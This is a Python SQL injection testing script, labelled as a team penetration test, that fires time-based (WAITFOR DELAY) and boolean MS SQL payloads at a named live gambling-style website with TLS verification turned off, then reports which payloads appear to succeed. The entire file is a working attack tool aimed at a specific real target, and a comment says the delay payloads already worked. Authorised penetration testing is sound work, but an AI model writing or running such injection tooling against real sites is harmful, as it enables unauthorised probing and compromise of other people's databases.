#!/usr/bin/env python3

"""
Simple SQL Injection Testing Script - No External Dependencies
Team B - Panama8888b Penetration Test
"""

import urllib.request
import urllib.parse
import time
import json
import ssl

class SimpleSQLTester:
    def __init__(self):
        self.base_url = "https://member.panama8888b.com/public/js/v2/app.js"
        # Create SSL context that doesn't verify certificates
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    def test_payload(self, payload, description):
        """Test a SQL injection payload"""
        print(f"\n[*] Testing: {description}")
        print(f"[*] Payload: {payload}")
        
        # Encode the payload
        encoded_payload = urllib.parse.quote(payload)
        url = f"{self.base_url}?v={encoded_payload}"
        
        try:
            # Create request with headers
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            start_time = time.time()
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as response:
                content = response.read().decode('utf-8', errors='ignore')
                end_time = time.time()
            
            response_time = end_time - start_time
            status_code = response.getcode()
            
            print(f"[+] Response Time: {response_time:.3f} seconds")
            print(f"[+] Status Code: {status_code}")
            print(f"[+] Content Length: {len(content)} bytes")
            
            # Check for SQL errors in response
            error_indicators = ['error', 'sql', 'syntax', 'database', 'mysql', 'mssql', 'oracle']
            content_lower = content.lower()
            
            for indicator in error_indicators:
                if indicator in content_lower:
                    print(f"[!] Potential SQL error indicator found: {indicator}")
            
            return response_time, status_code, content[:500]
            
        except urllib.error.URLError as e:
            if hasattr(e, 'code'):
                print(f"[!] HTTP Error: {e.code}")
                return 0, e.code, str(e)
            else:
                print(f"[!] URL Error: {e}")
                return 0, 0, str(e)
        except Exception as e:
            print(f"[!] Error: {e}")
            return 0, 0, str(e)
    
    def run_tests(self):
        """Run comprehensive SQL injection tests"""
        print("="*60)
        print("Simple SQL Injection Testing Tool")
        print("Target: https://member.panama8888b.com/public/js/v2/app.js")
        print("="*60)
        
        # Test baseline
        print("\n[*] Testing baseline...")
        baseline_time, _, _ = self.test_payload("25.1", "Baseline - Normal Request")
        
        # Test payloads that worked in curl
        payloads = [
            # Time-based payloads (these are the ones that worked!)
            ("25.1)) WAITFOR DELAY '0:0:5' --", "Time-based - WAITFOR DELAY 5 sec"),
            ("25.1)) WAITFOR DELAY '0:0:3' --", "Time-based - WAITFOR DELAY 3 sec"),
            ("25.1)) WAITFOR DELAY '0:0:1' --", "Time-based - WAITFOR DELAY 1 sec"),
            
            # Boolean-based payloads
            ("25.1)) AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --", "Boolean - INFORMATION_SCHEMA check"),
            ("25.1)) AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 --", "Boolean - sysobjects check"),
            ("25.1)) AND 1=1 --", "Boolean - True condition"),
            ("25.1)) AND 1=2 --", "Boolean - False condition"),
            
            # Database version checks
            ("25.1)) AND (SELECT SUBSTRING(@@version,1,1))='M' --", "Boolean - Version check (Microsoft)"),
            ("25.1)) AND LEN(DB_NAME())>3 --", "Boolean - Database name length"),
        ]
        
        results = []
        
        for payload, description in payloads:
            response_time, status_code, content = self.test_payload(payload, description)
            
            # Analyze results
            is_vulnerable = False
            vulnerability_reason = ""
            
            if "WAITFOR DELAY" in payload and response_time > (baseline_time + 2):
                is_vulnerable = True
                vulnerability_reason = f"Time delay detected! ({response_time:.3f}s vs baseline {baseline_time:.3f}s)"
                print(f"[!] VULNERABLE - {vulnerability_reason}")
            elif status_code != 200 and status_code != 0:
                is_vulnerable = True  
                vulnerability_reason = f"Unusual status code: {status_code}"
                print(f"[!] POTENTIAL VULNERABILITY - {vulnerability_reason}")
            elif any(error in content.lower() for error in ['error', 'sql', 'syntax']):
                is_vulnerable = True
                vulnerability_reason = "SQL error detected in response"
                print(f"[!] POTENTIAL VULNERABILITY - {vulnerability_reason}")
            else:
                print("[+] No clear vulnerability indicators")
            
            results.append({
                'payload': payload,
                'description': description,
                'response_time': response_time,
                'status_code': status_code,
                'vulnerable': is_vulnerable,
                'reason': vulnerability_reason
            })
            
            time.sleep(1)  # Rate limiting
        
        # Summary
        print("\n" + "="*60)
        print("SUMMARY OF RESULTS")
        print("="*60)
        
        vulnerable_count = sum(1 for r in results if r['vulnerable'])
        print(f"Total tests: {len(results)}")
        print(f"Potentially vulnerable: {vulnerable_count}")
        print(f"Baseline response time: {baseline_time:.3f} seconds")
        
        if vulnerable_count > 0:
            print("\n[!] VULNERABLE PAYLOADS FOUND:")
            for result in results:
                if result['vulnerable']:
                    print(f"  - {result['description']}")
                    print(f"    Payload: {result['payload']}")
                    print(f"    Response time: {result['response_time']:.3f}s")
                    print(f"    Reason: {result['reason']}")
                    print()
        
        return results

if __name__ == "__main__":
    tester = SimpleSQLTester()
    results = tester.run_tests()
    
    # Save results to file
    with open('/workspace/simple_sql_test_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[+] Results saved to: /workspace/simple_sql_test_results.json")